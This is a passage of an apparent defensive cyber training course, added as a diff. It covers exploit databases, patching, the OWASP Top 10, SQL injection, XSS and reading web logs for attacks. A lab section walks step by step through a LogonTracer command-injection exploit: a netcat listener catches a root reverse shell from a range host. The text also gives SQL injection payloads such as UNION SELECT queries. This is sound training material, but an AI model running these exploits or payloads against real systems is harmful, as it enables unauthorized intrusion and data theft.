@@ -707,7 +707,417 @@ There are 19 SharpHound logs, some with a destination port of 389 and some with 
 
 Add a condition to the search query so only event codes 4103 and 4104 are returned. Event code 4103 is PowerShell module logs, and 4104 is PowerShell script block logs.
 
+Sources for Known Exploits
+Searching for known exploits is a matter of conducting open-source research and consulting the appropriate resources. CDAs find the following resources helpful in searching for pre-existing exploits.
 
+﻿
+
+MITRE CVE
+﻿
+
+MITRE Common Vulnerabilities and Exposures (CVE) is not necessarily a repository of exploits, per se, but functions more like a catalog of known software vulnerabilities that establishes a standard on how they should be reported. Each vulnerability is assigned a CVE Identifier (CVE-ID); most exploits can be mapped back to a CVE-ID. MITRE's CVE database can be found at cve.mitre.org.
+
+﻿
+
+National Vulnerability Database
+﻿
+
+The National Vulnerability Database (NVD) is — as the name suggests — a database that stores information about vulnerabilities and is maintained by the National Institute of Standards and Technology (NIST). Unlike CVEs however, the NVD provides more comprehensive information on a vulnerability other than the fact that it exists. Some additional information that the NVD provides is the Common Vulnerability Scoring System (CVSS) score, as well as links to associated resources such as existing exploits. This allows for a more proactive approach, as a CVSS score provides a severity gauge that system owners can use to prioritize vulnerabilities that need to be addressed, rather than reacting due to being exploited. The NVD can be accessed by visiting nvd.nist.gov.
+
+﻿
+
+Exploit-DB
+﻿
+
+Exploit-DB is a database for publicly known exploits maintained by Offensive Security. Each entry maps back to a CVE-ID, which enables defenders to match exploits back to the corresponding vulnerability. The Exploit-DB is intended as a repository of exploits and PoCs rather than an advisory system. However, if there are exploits available for systems or software in the mission partner network on Exploit-DB, it would be advisable to expeditiously patch vulnerable systems or implement other mitigations.
+
+﻿
+
+Metasploit
+﻿
+
+The Metasploit Project is an open-source penetration testing platform maintained by Rapid7. The free version is known as the Metasploit Framework. While much less comprehensive than Exploit-DB, the Metasploit Framework contains hundreds of exploits that are very easy to use with plug-and-play functionality, which makes it popular for offensive and defensive cyber personnel alike. Exploit-DB often has exploits written to be easily integrated into the Metasploit Framework as well. If a mission partner is found to have internet-facing systems that are vulnerable to exploits found in the Metasploit Framework, Incident Response (IR) and forensics may be a more appropriate measure, as it is extremely likely that the network is already compromised.
+
+﻿
+
+In the following lab, use a terminal utility that queries a locally stored copy of Exploit-DB to search for publicly-available exploits.
+
+Recall that to get a list of running services, a port scan is conducted, which usually includes service versioning.
+
+
+3. Run the following command to conduct a port scan as well as gather more information about the service version and potential Operating System (OS) version against the first host while skipping host discovery. Using sudo prompts for a password, which is CyberTraining1!.
+(trainee@dmss-kali)-[~] $ sudo nmap -sS -sV -Pn -O 200.200.200.10
+
+Sometimes, Nmap prints more output from Transmission Control Protocol (TCP)/Internet Protocol (IP) stack fingerprinting from OS detection. The determination for the OS is still the same. 
+
+
+Based on the scan results, a possible Ubuntu OS with Secure Shell (SSH) and Hypertext Transfer Protocol (HTTP) is open. The SSH version is OpenSSH 8.2p1 and the HTTP server is Werkzeug HTTP Daemon (HTTPD) with a version of 0.14.1. SSH is running on the standard port, and HTTP is running on alternate port 8080 versus port 80.
+
+
+Note that while the results of the OS detection were inconclusive (only returning Linux rather than the specific distribution), the service versioning returned more specific information regarding the OS. This is because Nmap uses different probes while performing service versioning and OS detection.
+
+
+If there are no operational security concerns related to security products in the network, then more information is better — which is why -sV (probe for service/version info) and -O (OS detection) were both used despite returning different data.
+
+
+Exploits may or may not be OS — and service version — specific, so gathering as much information as possible is important.
+
+
+Since there is a web server running on the 200.200.200.10 host, gather additional information about what may be hosted on the server by visiting the webpage. There is a variety of web applications that have further vulnerabilities on top of the underlying web server software. For example, website content managers such as WordPress and Drupal have introduced several vulnerabilities that enabled attackers to conduct arbitrary remote code execution.
+
+
+4. Open Firefox and visit the following webpage:
+http://200.200.200.10:8080
+
+
+
+The web application that has been imported into the range relies on resources on the internet that are not accessible in the range. This is why the page does not render properly in the environment.
+
+The application running on the webserver is something called LogonTracer. However, no software version is available.
+
+
+At this point in time, the following leads for software to search for an exploit are available:
+OpenSSH 8.2
+Wekzeug HTTPD 0.14.1
+LogonTracer unknown software version
+
+This is enough information to begin searching Exploit-DB for exploits. Kali Linux has a CLI that allows users to search exploits in Exploit-DB. A local copy of Exploit-DB is maintained, so for the newest exploits, the database may require an update. This can be accomplished by running the following command:
+searchsploit -u
+
+
+
+NOTE: Internet connectivity is needed for this to work, so this is not performed in this lab.
+
+
+5. View the help menu for SearchSploit to get a general usage idea of the utility by running the following command:
+(trainee@dmss-kali)-[~] $ searchsploit -h
+
+The syntax is simple and reasonably straightforward. For the searches in the following steps, do not use any switches.
+
+
+6. Run the following command to search for exploits related to OpenSSH:
+(trainee@dmss-kali)-[~] $ searchsploit openssh
+
+There does not seem to be a viable OpenSSH exploit for the current software version — 8.2. For reference, knowing what to look for depends on what is being attempted. To gain access to the system, look for something that enables command execution, whereas to ensure that a host had a failover system in place, then look for a Denial of Service (DoS). To see if the systems can be remotely accessed and execute the desired commands, good exploit candidates would have the following attributes:
+Matching software
+Matching software version
+Matching OS (if applicable)
+If the exploit must be done over the network, then remote somewhere in the exploit title or path
+May allude to Code Execution or Command Execution
+May allude to being Unauthenticated, as there are no credentials to use.
+
+7. Run the following command to search for exploits related to Wekzeug HTTPD:
+(trainee@dmss-kali)-[~] $ searchsploit wekzeug
+
+Once again, there are no viable results.
+
+
+8. Run the following command to search for exploits related to LogonTracer:
+(trainee@dmss-kali)-[~] $ searchsploit logontracer
+
+There is an exploit present for the software, though unfortunately, the version is unknown. This is a good time to read the exploit to see if it can be used. Notice the partial path provided — multiple/webapps/49918.py. The filename — 49918.py — is also the exploit ID. Make note of the exploit ID for the next step. 
+
+9. Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
+(trainee@dmss-kali)-[~] $ searchsploit -p 49918
+
+The full file path — as shown from the results of the command — is /usr/share/exploitdb/exploits/multiple/webapps/49918.py. CDAs should always look at the exploit before using it for a few reasons such as:
+Finding usage instructions
+Finding out more information about what the exploit is actually doing
+Making modifications to the exploit script
+Ensuring that there is no malicious code in the exploit
+
+10. Run the following command to read the exploit script:
+(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py
+
+From lines 13–16, the user needs to provide the attacker's IP address, attacker's port, and the Uniform Resource Locator (URL) to the victim.
+
+From lines 22–29, it is evident that it is a command injection vulnerability that is being exploited, which sends back a shell to an attacker's listener.
+
+Keep in mind, it is not necessary to understand everything that is happening in the script, just a general idea of what it is doing. There is no need for an in-depth code review.
+
+
+11. Run the following command to print the exploit script's help menu:
+(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h
+
+Now the syntax of the command is known.
+
+12.  Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
+(trainee@dmss-kali)-[~] $ nc -nlvp 4444
+
+13. Open a new tab or window, and run the following command to run the exploit:
+(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080
+
+The output states If the terminal hangs, you might have a shell. Since the terminal hangs immediately after sending the exploit, this is a good sign.
+
+14. Switch back to the other terminal where Netcat was running.
+
+A shell was received from the exploited host. Notice that a few seemingly random characters are returned in the prompt as well. These are escape codes, which are responsible for formatting text that is typically seen when entering text into a terminal and do not affect running commands.
+
+15. Run a command to check the functionality of the shell.
+(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami
+
+The shell appears to be in working order, and notice you are the root user on the victim host.
+
+Mitigating Known Exploits
+Mitigating known exploits is usually a matter of removing the underlying vulnerability; if the vulnerability does not exist, then the exploit does not work. However, network defenders need to be aware of the vulnerabilities and remain updated on the latest ones to be able to effectively mitigate them. Mitigating vulnerabilities may be composed of a few elements.
+
+﻿
+
+﻿
+
+﻿
+
+Asset Management
+﻿
+
+To know which devices are vulnerable, it is necessary to know what devices actually exist within the network. While this sounds like a simple matter, asset management can quickly get out of hand, especially in larger organizations. Vulnerable devices do not just apply to workstations and servers; it applies to any computing device running some kind of OS. This includes Internet of Things (IoT) devices, multi-function devices, printers, video teleconferencing equipment, etc., which many network defenders overlook. 
+
+﻿
+
+Updates and Patching Policy
+﻿
+
+Updates and patches are among the most effective measures of mitigating known exploits. Once a vulnerability is made public, vendors typically issue a patch that can be applied to the vulnerable system. Patches are often referred to as hotfixes or security updates. While applying the necessary patches seems like a common-sense measure, organizations may not have an effective patching policy in place, which leaves them vulnerable to the whims of attackers. For example, in the Equifax Breach that occurred in 2017, attackers exploited a vulnerability in Apache Struts when the patch was released two months prior.
+
+﻿
+
+Once an idea of what type of systems exist in the network is determined, the next piece of the puzzle is to examine the update and patching policy. Are updates done monthly or weekly or even at all? Are they rolled out automatically? Which systems receive patches? These are some of the questions asked when investigating the updates and patching policy. A good patching policy typically includes the following steps:
+
+Evaluating patches
+Testing patches
+Approving patches
+Deploying patches
+Verifying patch deployment
+Some companies publish updates on a specific day of the month. Adobe, Microsoft, and Oracle release updates every second Tuesday of the month. This makes it easy for system administrators to plan around them and gives them time to schedule testing and deployment. Patch Tuesday — as it was coined, unfortunately — is followed by Exploit Wednesday. Since attackers also know the update schedule, they often attempt to reverse engineer the patches released on Tuesday, and then exploit devices on Wednesday since it is common for system administrators to not issue updates immediately.
+
+﻿
+
+Periodic Vulnerability Scans/Assessments
+﻿
+
+Vulnerability scanning and assessments were covered in a previous module. Some of the tools covered included Assured Compliance Assessment Solution (ACAS), OpenVAS, and Nmap. Conducting periodic vulnerability scans reveals vulnerabilities not addressed by updates and patching. They may also catch configuration-related vulnerabilities, weak passwords, etc. Vulnerability scans allow system administrators to proactively identify existing vulnerabilities and defend their systems before attackers exploit them. One important note to keep in mind is that a vulnerability scanner is only as good as its signatures. To get the best use out of a vulnerability scanner, conduct regular updates on the software to have the most up-to-date vulnerability database.
+
+sqli
+
+Web Attacks Overview 
+Adversaries may look to exploit the Application layer of the Open Systems Interconnection (OSI) model — Layer 7. Layer 7 is the top layer of the model. It is at the Application layer where users interact with software (applications) that can be connected to the internet. The servers and databases are responsible for hosting the web applications, which may be vulnerable to attacks. The servers and databases connected to the internet are designed to be running and reachable by users at all times, meaning they are constantly susceptible to an attack. The servers and databases also often contain sensitive data regarding Personal Identifiable Information (PII) and information regarding the systems and services to which they are connected, making them an attractive target for the adversary. Another obstacle for defense teams to consider is the location of the servers and databases on the network. 
+
+OWASP Top 10 Web Application Security Risks
+﻿
+
+(Image from OWASP)
+
+﻿
+
+The leading organization in defining risks, vulnerabilities, and providing defensive strategies for web applications and attacks is Open Web Application Security Project® (OWASP). OWASP is a nonprofit foundation whose primary goal is to improve the security of software. The OWASP Top 10 Web Application Security Risks — simply referred to as the OWASP Top 10 — is a standard awareness document for developers and web application security. The OSWAP Top 10 represents a broad consensus about the most critical security risks to web applications. Below is the 2024 OWASP Top 10:
+
+﻿
+
+1. Broken Access Control
+﻿
+
+User access restrictions are often not properly enforced or enforced insecurely, which can allow attackers to gain unauthorized functionality (e.g., administrator portal) or access to other user accounts, data, etc.
+
+﻿
+
+2. Cryptographic Failures 
+﻿
+
+A broad symptom rather than a root cause, the focus is on failures related to cryptography — or lack thereof. This often leads to exposure of sensitive data. An organization must determine the protection needs of data in transit and at rest. For example, passwords, credit card numbers, health records, PII, and business secrets require extra protection, mainly if that data falls under privacy laws (e.g., European Union's General Data Protection Regulation [GDPR]) or regulations (e.g., financial data protection such as Payment Card Industry Data Security Standard [PCI DSS]).
+
+﻿
+
+3. Injection
+﻿
+
+Injection flaws occur when untrusted data is passed to an interpreter as part of a command or query within a web application. The untrusted data can allow the attacker to execute code on the underlying web server. These flaws can be associated with, but are not limited to, SQL, NoSQL, Operating System (OS), and Lightweight Directory Access Protocol (LDAP), and can provide access to the underlying web server in many cases. Exploitation leads to server access.
+
+﻿
+
+4. Insecure Design 
+﻿
+
+Insecure design is a broad category representing different weaknesses, expressed as missing or ineffective control design. Insecure design is not the source for all other Top 10 risk categories. There is a difference between insecure design and insecure implementation. The differentiation between design flaws and implementation defects is necessary as they have different root causes and remediation. A secure design can still have implementation defects leading to vulnerabilities that may be exploited. An insecure design cannot be fixed by a perfect implementation as, by definition, they need security controls that were never created to defend against specific attacks. One factor that contributes to insecure design is the lack of business risk profiling inherent in the software or system being developed, and thus the failure to determine what level of security design is required.
+
+﻿
+
+5. Security Misconfiguration
+﻿
+
+Security misconfiguration is the most commonly seen issue. These misconfigurations cover all aspects of security from insecure default configurations, unfinished installations, unpatched services, verbose logging, and many more. 
+
+﻿
+
+6. Using Components with Known Vulnerabilities
+﻿
+
+Web applications are often a melting pot of code from many other sources. Using modules and libraries that run with the same privileges as the rest of the web applications can increase the speed of development, but can also enable unknown vulnerabilities on a web application. If external code is not reviewed for patches and vulnerabilities, even the securest of coding practices can be left vulnerable. 
+
+﻿
+
+7. Identification and Authentication Failures
+﻿
+
+Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. There may be authentication weaknesses if the application:
+
+Permits automated attacks such as credential stuffing, where the attacker has a list of valid usernames and passwords.
+Permits brute force or other automated attacks.
+Permits default, weak, or well-known passwords, such as Password1 or admin/admin.
+Uses weak or ineffective credential recovery and forgot-password processes, such as knowledge-based answers, which cannot be made safe.
+8. Software and Data Integrity Failures 
+﻿
+
+Software and data integrity failures relate to code and infrastructure that do not protect against integrity violations. An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and Content Delivery Networks (CDN). An insecure Continuous Integration/Continuous Delivery (CI/CD) pipeline can introduce the potential for unauthorized access, malicious code, or system compromise. Lastly, many applications now include auto-update functionality, where updates are downloaded without sufficient integrity verification and applied to the previously trusted application. Attackers could potentially upload their own updates to be distributed and run on all installations. Examples that are vulnerable to insecure deserialization include objects or data encoded or serialized into a structure that an attacker can see and modify.
+
+﻿
+
+9. Insufficient Logging and Monitoring
+﻿
+
+Logging and monitoring are paramount for externally-facing services. Logging and monitoring of those logs are required in any Incident Response (IR) to draw the full picture of an incident. Without logging and monitoring, it is very difficult to review what happened during the incident or to even realize that an event occurred. Exploitation is not really a factor, but insufficient logging and monitoring affect all other compromise remediation.
+
+10. Server-Side Request Forgery﻿
+
+Server-Side Request Forgery (SSRF) flaws occur when a web application is fetching a remote resource without validating the user-supplied Uniform Resource Locator (URL). It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, Virtual Private Network (VPN), or another type of network Access Control List (ACL).﻿
+
+As modern web applications provide end-users with convenient features, fetching a URL becomes a common scenario. As a result, the incidence of SSRF is increasing. Also, the severity of SSRF is becoming higher due to cloud services and the complexity of architectures.
+
+﻿
+In many cases, the OWASP Top 10 can be mitigated by filtering the user input prior to passing the data to the underlying services. Vigilance in patching and proper code review of any externally-sourced code helps decrease exploit vectors. If the web application is hosted on a web server, it is important to securely configure that underlying web server service as well as the other services on the host, and remove any unneeded services. For example, Common UNIX Printing System (CUPS) is a print server that is installed and enabled on many Linux distributions by default. CUPS has had nine documented Common Vulnerabilities and Exposures (CVE) since 2017, which include Remote Code Execution (RCE) that could lead to the compromise of a web server without any interaction with the web application itself.
+
+Which of the OWASP Top 10 occurs when user access restrictions are often not properly enforced or enforced insecurely?
+
+SQLI Overview
+SQLI is an attack exploiting the injection of SQL commands into the SQL queries of a web application. A successful SQLI attack gains the adversary access to a database that operates as the backend to a web application. Web applications commonly use a database for storing and managing data such as user credentials. To interact with databases, entities such as systems operators, programmers, and web applications use the Structured Query Language (SQL). The code takes care of establishing and keeping the connection to the database by using connectors. The fundamental principle of an injection attack is identifying a vulnerability that enables an escape from the intended code or query, allowing the attacker to inject arbitrary code of their own, which is executed by the victim server under the guise of whichever process presents the web interface or backend database externally. In a SQLI attack, which targets poorly-coded requests for input that is inserted into a query to the backend database, the attacker principally seeks to achieve an escape through the use of characters that a web engineer failed to sanitize.
+
+Most modern web applications need to keep some permanent storage. Storage is typically accomplished with a database. Web applications commonly communicate with their database backend using SQL. With SQL, the applications create queries to read and write information in the database.
+
+In addition, web applications frequently exploit user input as part of their SQL queries. However, SQL is often constructed as a string in the underlying programming language and passed to the database. If the programmer is not careful, there is a blurred line between user input and SQL query structure, allowing users to modify the query structure and change the query's intended behavior. This is done by using input that makes use of the SQL query syntax. Since the user input is concatenated to the rest of the query, the database interprets the SQL syntax in the user input as part of the query, causing the query to change into something potentially harmful.
+
+SQLI Fundamentals
+To understand how SQLIs happen, consider the following SQL query:
+
+Figure 7.3-2 displays a basic query used to authenticate a user on a web application. In this scenario, the username input gets placed between the quotes after username and the password input between the quotes after password. If the user entered a username of 'admin' and a password of 'test123,' the query that gets passed to the database is the following:
+
+If the underlying programming language concatenates the user input, the SQL query interpreter converts any special characters in the username or password. This allows the query syntax to be changed. For example, consider what happens if the username is set to a single quote, but the password remained test123. The resulting SQL query is the following:
+
+The query example above contains three single quotes in a row to the database server. These quotes are interpreted as two strings side by side. The first string, delimited by the first two single quotes, is interpreted as an empty string. The third quote starts another adjacent string that ends with the equal sign after the word password. Adjacent strings are typically valid syntax in SQL queries. However, the second string is immediately followed by the word test123'. The database interprets the string as a keyword. But test123' is not a valid keyword in SQL, so the database throws an error for an ill-formed SQL query.
+
+﻿
+The main point from the example above is that by including certain special characters, the attacker causes the database to misinterpret the SQL query and even inject SQL keywords that were not originally there. This can allow an attacker to inject functionality into the SQL query.
+
+Now, consider a common proof of concept attack for this vulnerability type, in which the username is set to admin and the password to the following:
+
+password' or 1='1
+﻿
+
+This results in the following query:
+
+The first quote in the password field is interpreted as the end of the password value.
+
+The or is interpreted as a logical OR operator.
+
+The 1='1' is interpreted as an added condition.
+
+In other words, find all users with the username admin and either the password equal to password or where the condition 1=1 is true. The final condition is always true, and so the check passes regardless of whether the password is actually password.
+
+Common Characters and Syntax
+﻿
+SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:
+
+Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 
+
+Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 
+
+Common Characters and Syntax
+
+
+SQLI attacks use common syntax and characters to leverage vulnerabilities in database design. Table 7.3-1 includes characters — as defined by Microsoft — that are frequently seen in SQLI attacks:
+
+Characters that perform delimiter functions determine the limits or boundaries of the areas they are querying. 
+
+
+Operators in SQL use characters to manipulate and find data within the database. A common operator that is utilized in an SQLI attack is UNION. The UNION operator is used in SQL to combine two or more SELECT statements. Additionally, the UNION operator can be used to retrieve data from multiple tables within a database. The UNION operator can help the adversary discover table s, columns,  users, and file paths. 
+
+Cross-Site Scripting Overview
+XSS is an attack in which its ultimate purpose is to inject HTML — known as an HTML injection — into a user’s web browser. XSS is one of the oldest web application attacks known and is dated to around 1996–1998, when it was possible to control frames within a webpage through injected code, providing the crossing of website boundaries. Currently, XSS is still on top of the OWASP Top 10 Web Application Security Risks. XSS is considered an attack against the user of a vulnerable website; it is difficult to anticipate and prevent. Knowledgeable developers actively trying to prevent attacks may be vulnerable to other possible forms of attack that they are not aware of.
+
+﻿
+
+HTML and CSS Markup Attacks
+﻿
+
+The most basic of XSS attacks is the insertion of HTML and Cascading Style Sheets (CSS) content into the HTML of a website. This simple attack is executed by injecting a comment or annotation that is then displayed on the website. Website users do not have any power to stop this attack as they are not able to turn off HTML rendering in the browser (in the same way that they can turn off JavaScript or images). The adversary who accomplishes an exploit like this can obscure part or all of the page, and render official-looking forms and links for users to interact with.
+
+﻿
+
+Stored XSS
+﻿
+
+Stored XSS is a version of the attack where input is stored on the target server. Typically the input is stored in a database, message forum, log, or comment field. The user then interacts with the website, which retrieves the stored data from the website and sends it to the user. 
+
+﻿
+
+Reflected XSS
+﻿
+
+As defined by OWASP, reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user-provided data. To execute the reflected version of the XSS attack, an injected script reflects off the target server. The reflection is done by a page search result, an error message, or another created message by the user. Reflect XSS is a very damaging style of attack because it weaponizes the trust of the server from which the code is reflecting. 
+
+﻿
+
+Document Object Model-Based XSS
+﻿
+
+Document Object Model (DOM)-Based XSS, also referred to as Type-0 XSS, is a version of the attack where the execution of the attack occurs as a result of modifying the DOM environment in the target's browser. The modification occurs within the client-side script, as a result, the script does not perform as expected. When executed properly, the page itself — the HTTP response — does not change, but the client-side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.
+
+Identifying SQLI in Logs
+Log files provide a valuable piece of evidence in helping identify a web application attack. The logs collected on servers and applications record all actions and requests made to the device. Hidden within the logs are pieces of information that identify the type of attack, when the attack occurred, and what IP address was responsible.
+
+﻿
+
+Web logs are log files that are created and maintained by web servers on a network. Web logs contain information about the connections and requests made to the website or application — information that is critical in an investigation. On a typical web server, there are two types of log files: access.log and error.log. The access.log file contains all requests made by users interacting with the application. Information in the access.log file includes what pages the users are viewing, the status of requests, and the speed requests were served. The error.log contains all errors the server encountered. For the purposes of defense, security, and investigation, the access.log is the primary focus.
+
+﻿
+
+Expected Web Log Entry
+﻿
+
+Below is a sample entry in the access.log. The entry typically — and expectedly — contains the successful login of the DVWA:
+
+127.0.0.1 - - [20/Oct/2021:15:01:12 -0400] "GET /dvwa/login.php HTTP/1.1" 200 1415 "http://localhost/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
+﻿
+
+Starting from the left, the logs provide the following information:
+
+IP address: 127.0.0.1 
+Date and time of request: October 20, 2021 @ 15:01:12 
+Time on the server (relative to UTC): -0400
+Request made: GET /dvwa/login.php HTTP/1.1" 200
+The request here is the user logging into the DVWA via the use of HTTP. The number 200 is a Hypertext Transfer Protocol (HTTP) status code — 200 indicates the request succeeded. In this case, the user was able to log in.
+URL: http://localhost/ 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (Konqueror Hyper Text Markup Language [KHTML], like Gecko) Chrome/44.0.2403.155 Safari/537.36
+Web Log Entry with SQLI Attack
+﻿
+
+Below is a sample entry in the access.log including a successful SQLI attack:
+
+127.0.0.1 - - [21/Oct/2021:09:30:02 -0400] "GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200 4342 "http://localhost/dvwa/vulnerabilities/sqli/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
+﻿
+
+Starting from the left, the logs provide the following information:
+
+IP address: 127.0.0.1 
+Date and time of request: October 21, 2021 @ 09:30:02 
+Time on the server (relative to Greenwich Mean Time): -0400
+Request made: GET /dvwa/vulnerabilities/sqli/?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit HTTP/1.1" 200
+The request here is the user making a request within the DWVA SQLI page. The user requested ?id=%27+UNION+SELECT+null%2C+%40%40datadir+%23&Submit=Submit. The HTTP status code 200 indicates the request succeeded. 
+URL: http://localhost/dvwa/vulnerabilities/sqli
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
+The use of the UNION operator, as well as the URL encoded @ symbol (hex %40) for the global variable, is an immediate red flag and indicative of a potential attempt to leverage the SQL database. The log entry above was taken from the SQLI lab earlier in this lesson where SQLI was used to derive the database's location. The query is provided below:
+
+'UNION SELECT null, @@datadir#
+
+'UNION ALL SELECT current_user(),user() #             =============       The database's current user
 
 
 
